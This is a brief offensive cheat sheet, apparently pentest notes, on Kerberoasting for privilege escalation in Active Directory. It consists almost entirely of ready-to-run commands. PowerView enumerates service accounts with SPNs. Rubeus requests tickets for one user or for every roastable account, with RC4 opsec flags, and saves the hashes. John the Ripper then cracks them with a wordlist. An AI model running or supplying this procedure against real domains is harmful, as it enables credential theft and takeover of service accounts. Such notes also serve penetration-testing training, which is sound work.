## PRivileges Escalation in AD


### Kerberoasting
---

```powershell
# Standard AD User. Get Domain Users SPN. Users that are for services
C:> . PowerView.ps1
C:> Get-DomainUser -SPN
```
- **Using `Rubeus.exe`**
```powershell
# Get kerberos stats
C:> Rubeus.exe /stats

# Use Rubeus to request a TGS for <user>
C:> Rubeus.exe kerberoast /user:<user> /simple

# Accounts supporting only RC4
C:> Rubeus.exe kerberoast /stats /rc4opsec
C:> Rubeus.exe kerberoast /user:<user> /simple /rc4opsec

# Kerberoast all possible accounts
c:> Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Crack with John
C:> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```
